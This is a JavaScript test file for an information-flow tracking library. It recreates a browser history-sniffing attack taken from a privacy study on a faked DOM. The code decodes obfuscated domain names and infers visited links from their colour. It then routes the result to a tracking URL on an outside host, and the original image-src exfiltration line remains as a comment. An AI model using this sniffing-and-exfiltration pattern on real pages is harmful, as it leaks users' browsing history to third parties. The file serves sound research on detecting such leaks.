//Example from the paper "An Empirical Study of Privacy-Violating Information Flows
//in JavaScript Web Applications" 

// Sources: document.element.color (high), navigatorAppName (low)
// Sinks: document.img.src (low)


//This is a fake DOM slice to run the example
Math.random = require("./DeterministicRandom.js")(23);
var utils = require("iflow");
function mySink(x) {
    return x;
}
utils.addSink(mySink);

var document = {ol: {},  element: {color : utils.source("rgb(12, 34, 56)", utils.HIGH_LEVEL, "element-color")}, img:{src:""}};
//simulate a field sink with a getter.



var k = { 0: "qpsoivc/dpn", 1: "sfeuvcf/dpn"}; //23 entries in the original example
var g = [];
for(var m in k) {
  var d = k[m];
  var a = "";
  for(var f = 0; f < d.length; f++) {
    a += String.fromCharCode(d.charCodeAt(f)-1);
  }
  console.log(a); //decoding the array entry	
  var h = false;
  for(var j in {"http://":"","http://www.":""}){
//      var l = document.createElement("a"); // replaced by the next 2 lines
	document.element.a="a";
        l=document.element;
        l.href = j + a;
    	console.log(l.href);	
//    	document.getElementById("ol").appendChild(l); // replaced by next line
	document.ol.link = l;
        var e = "";

    var navigatorAppName = "Chrome";  // replaces navigator.appName 
    if(navigatorAppName.indexOf("Microsoft") != -1 ){
//       e = l.currentStyle.color; // replaced by next line
	 e = document.element.color;
   } 
   else {
//       e = document.defaultView.getComputedStyle(l, null).getPropertyValue("color");
	e = document.element.color;
    }
    console.log("Color:" + e);	

   if(e == "rgb(12, 34, 56)" || e == "rgb(12,34,56)") { h = true; }
  }
  if(h) { g.push(m); }
}
var b = (g instanceof Array)? g.join(",") : "";
//var c = document.createElement("img");
var c = document.img;
// c.src= "http://ol.youporn.com/blank.gif?id="+b; //replaced with a sink call
mySink("http://ol.youporn.com/blank.gif?id="+b);
console.log(b);
//document.getElementById("ol").appendChild(c)
document.ol.link1 = c;
console.log(document.ol.link1);

